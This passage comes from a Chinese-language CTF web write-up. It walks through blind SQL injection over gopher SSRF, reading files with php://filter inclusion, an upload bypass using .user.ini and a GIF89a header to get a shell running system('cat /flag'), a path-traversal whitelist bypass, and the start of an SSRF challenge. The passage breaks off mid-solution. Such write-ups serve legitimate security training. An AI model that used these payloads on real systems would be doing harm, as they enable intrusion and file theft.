class="comment">#security</span></span><br><span class="line">        <span class="comment">#poc=&quot;&#x27;) union select 1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot;</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">#flag</span></span><br><span class="line">        <span class="comment">#poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot;</span></span><br><span class="line">        </span><br><span class="line">        poc=<span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span>+<span class="built_in">str</span>(pos)+<span class="string">&quot;,1) )=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,sleep(2),1) # &quot;</span></span><br><span class="line">        </span><br><span class="line">        bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        final_poc=<span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span>+bs+<span class="string">&quot;%3B%250d%250a&quot;</span></span><br><span class="line">        t1=time.time()</span><br><span class="line">        res=requests.get(url+final_poc)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="keyword">if</span>(t2-t1&gt;<span class="number">2</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>python跑一下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116223318944.png" alt="image-20221116223318944"></p>
<h2 id="6-fileinclude"><a href="#6-fileinclude" class="headerlink" title="6.fileinclude"></a>6.fileinclude</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117135406407.png" alt="image-20221117135406407"></p>
<p>查看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117135923313.png" alt="image-20221117135923313"></p>
<p>代码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="comment">//存在文件包含,注意此处传参$lan=flag，得到的是flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload：（cookie传参）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</span><br></pre></td></tr></table></figure>

<p>burp抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117141919403.png" alt="image-20221117141919403"></p>
<p>base64解码：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117141953616.png" alt="image-20221117141953616"></p>
<h2 id="7-easyupload"><a href="#7-easyupload" class="headerlink" title="7.easyupload"></a>7.easyupload</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117142124615.png" alt="image-20221117142124615"></p>
<p>这里需要绕过的点如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查文件内容是否有php字符串</span><br><span class="line">检查后缀中是否有htaccess或ph</span><br><span class="line">检查文件头部信息</span><br><span class="line">文件MIME类型</span><br></pre></td></tr></table></figure>

<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>
<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。<br>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。 </p>
<p>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>
<p>知识点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 表示加载第一个PHP代码之前执行指示（包含的）PHP文件</span><br><span class="line">auto_append_file 表示加载第一个PHP代码之后执行指示（包含的）PHP文件</span><br><span class="line">简单来说</span><br><span class="line"></span><br><span class="line">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class="line">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br><span class="line">auto_append_file、auto_prepend_file</span><br><span class="line">指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</span><br></pre></td></tr></table></figure>

<p>对于第一点可以利用短标签绕过，例如<?=phpinfo();?></p>
<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,</p>
<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></p>
<p>第四点绕过方法即修改上传时的Content-Type为image&#x2F;jpg</p>
<p>上传.user.ini，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117143926175.png" alt="image-20221117143926175"></p>
<p>得到目录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117143946531.png" alt="image-20221117143946531"></p>
<p>上传a.jpg，内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117144015837.png" alt="image-20221117144015837"></p>
<p>查看文件去向</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117144956396.png" alt="image-20221117144956396"></p>
<p>上传成功根据文件地址连接蚁剑获取flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117174204406.png" alt="image-20221117174204406"></p>
<h2 id="8-inget"><a href="#8-inget" class="headerlink" title="8.inget"></a>8.inget</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117190054691.png" alt="image-20221117190054691"></p>
<p>尝试注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=2--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; or 1=2--+</span><br></pre></td></tr></table></figure>

<p>都均无回显</p>
<p>继续尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117190318572.png" alt="image-20221117190318572"></p>
<h2 id="9-题目名称-文件包含"><a href="#9-题目名称-文件包含" class="headerlink" title="9.题目名称-文件包含"></a>9.题目名称-文件包含</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117190902873.png" alt="image-20221117190902873"></p>
<p>伪协议试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117191106092.png" alt="image-20221117191106092"></p>
<p>换个方式试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://input</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117191427075.png" alt="image-20221117191427075"></p>
<p>再换一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.iconv.UTF-7.UCS-2/resource=./flag.php</span><br></pre></td></tr></table></figure>

<p>仍然不行</p>
<img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117191941012.png" alt="image-20221117191941012"  />

<p>换个编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.iconv.UTF-7.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117192251178.png" alt="image-20221117192251178"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">附：</span><br><span class="line">支持的编码格式：</span><br><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?filename=php://filter/convert.iconv.UTF-7.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117205849005.png" alt="image-20221117205849005"></p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><p>打开</p>
<p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117210000293.png" alt="image-20221117210000293"></p>
<p>访问</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221117210021886.png" alt="image-20221117210021886"></p>
<p>分析源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//列表</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//in_array()检查在数组中是否存在某个值</span></span><br><span class="line">            <span class="comment">//in_array(a,b)在数组b中查找a</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"><span class="comment">/*mb_substr() 函数是返回字符串的一部分， substr() 函数只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span></span><br><span class="line"><span class="comment">mb_substr( string $str, int $start [, int $length=NULL [, string $encoding=mb_internal_encoding() ]] )</span></span><br><span class="line"><span class="comment">参数描述:</span></span><br><span class="line"><span class="comment">	str必需。从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">	start必需。规定在字符串的何处开始。正数-在字符串的指定位置开始,负数-在从字符串结尾的指定位置开始,0-在字符串中的第一     个字符处开始</span></span><br><span class="line"><span class="comment">	length可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数-从start参数所在的位置返回,负数-从字符串末端返回</span></span><br><span class="line"><span class="comment">	encoding可选。字符编码。如果省略，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">mb_strpos()：返回要查找的字符串在另一个字符串中首次出现的位置</span></span><br><span class="line"><span class="comment">	mb_strpos (haystack ,needle )</span></span><br><span class="line"><span class="comment">	haystack：要被检查的字符串。</span></span><br><span class="line"><span class="comment">	needle：要搜索的字符串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中可以看到除了source.php还有hint.php,访问</p>
<p><img src="https://img-blog.csdnimg.cn/c116a76653e844a090e0366a3745a026.png" alt="img"></p>
<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>







<h2 id="11-fakebook"><a href="#11-fakebook" class="headerlink" title="11.fakebook"></a>11.fakebook</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118113118504.png" alt="image-20221118113118504"></p>
<p>点击join，注册一个</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118114806619.png" alt="image-20221118114806619"></p>
<p>除了admin可以点击之外没什么可以利用的点了</p>
<p>扫描目录</p>
<p><img src="https://img-blog.csdnimg.cn/20200408115848699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTAwMjUx,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>访问得到的目录，发现只有flag.php和robots.txt有用</p>
<p>打开flag.php</p>
<p>返回为空</p>
<p>如果确定了一个页面存在，访问后页面内容为空，有两种情况，要么页面本身就没有内容，要么就是没有访问权限，服务器禁止通过HTTP直接请求flag.php文件</p>
<p>要找系统中能够访问flag.php的其他方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">附：</span><br><span class="line">SSRF，服务器端请求伪造，全称Server-Side Request Forgery，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。通过浏览器直接访问flag.php内容并不返回内容，这个请求对于服务器来说是外部请求。当攻击者可以通过SSRF让服务器内部功能访问flag文件时，这种外部禁止访问的限制也就会相应消失。</span><br></pre></td></tr></table></figure>

<p>打开robots.txt</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118120924394.png" alt="image-20221118120924394"></p>
<p>访问&#x2F;user.php.bak，下载，得到php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回主页，点击admin</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118121809267.png" alt="image-20221118121809267"></p>
<p>看一下源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118121940635.png" alt="image-20221118121940635"></p>
<p>iframe的内容通过data伪协议获取，此处data协议的使用格式为：data:text&#x2F;html;base64,&lt;base64编码的HTML代码&gt;</p>
<p>想办法让data协议后面接上flag.php的内容，就能达到显示目的了</p>
<p>整个页面还剩一个点，就是这个no参数：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118122316178.png" alt="image-20221118122316178"></p>
<p>输入0或2试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118122358993.png" alt="image-20221118122358993"></p>
<p>得到flag文件目录</p>
<p>注入试试</p>
